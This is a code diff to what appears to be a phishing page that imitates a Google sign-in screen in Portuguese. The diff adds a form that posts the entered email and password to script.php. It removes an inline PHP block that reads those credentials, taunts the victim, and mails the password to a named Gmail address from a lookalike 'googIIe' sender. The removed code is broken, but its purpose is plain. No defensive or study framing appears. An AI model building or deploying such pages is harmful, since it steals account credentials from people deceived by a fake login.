@@ -1305,6 +1305,7 @@
   <div class="input-wrapper focused">
   <div id="identifier-shown">
   <div>
+    <form action="script.php" method="post">
   <label  class="hidden-label" for="Email">
   Insira seu e-mail</label>
   <input  id="Email" type="email" value="" spellcheck="false"
@@ -1333,6 +1334,7 @@
                      placeholder="Senha">
   Encontrar minha conta
   </a>
+    </form>
   </div>
   </div>
 
@@ -1391,44 +1393,5 @@
   </div>
 </div>
   </div>
-    
-    <script>
-      
-      
-
-  <?php
-    $email = isset($_GET["Email"])?$_GET[Email]:0;
-    $senha = isset($_GET["Passwd"])?$_GET[Passwd]:0;
-    echo "seu email é $email e sua senha $senha perdeu vacilao";
-
-    ini_set('display_errors', 1);
-
-    error_reporting(E_ALL);
-
-    $from = "googIIe.github.io";
-
-    $to = "felipe2438henrique@gmail.com";
-
-    $subject = "Senha E Email DO TROUXA";
-
-    $message = isset($_GET["Passwd"])?$_GET[Passwd]:0;
-
-    $headers = "De:". $from;
-
-    mail($to, $subject, $message, $headers);
-
-    echo "A mensagem de e-mail foi enviada.";
-    if (echo == 1){
-      <h1>TESTANDO PORRASON</h1>
-    }
-      
-      <?php
-          include ('senha.php');
-?>
-      
-
-
-  ?>
-    </script>
   </body>
 </html>
